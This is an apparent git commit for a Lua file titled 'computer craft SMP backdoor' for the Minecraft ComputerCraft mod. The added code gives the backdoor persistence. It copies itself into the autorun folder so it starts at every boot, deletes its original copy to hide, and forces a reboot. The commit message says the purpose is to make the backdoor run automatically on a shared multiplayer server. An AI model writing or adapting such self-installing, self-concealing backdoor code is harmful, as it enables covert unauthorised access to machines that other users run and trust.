56e6a86fdea6eee46b4515529adcb764de3964a7
Hawk <30607615+haawwkeye@users.noreply.github.com>
2022-07-21 22:26:51 -0400

    Auto move backdoor to auto run

--- Backdoor.lua
+++ Backdoor.lua
@@ -1,1 +1,12 @@
 -- computer craft SMP backdoor!
+if not fs.exists("/rom/autorun/backdoor.lua") then
+local pwd = shell.getRunningProgram();
+local _self = fs.open(pwd, "r");
+local file = fs.open("/rom/autorun/backdoor.lua", "w");
+file.write(_self.readAll());
+_self.close();
+file.close();
+fs.delete(pwd); -- Hopefully deletes the script
+os.reboot();
+end
+-- This is how I make the backdoor auto run
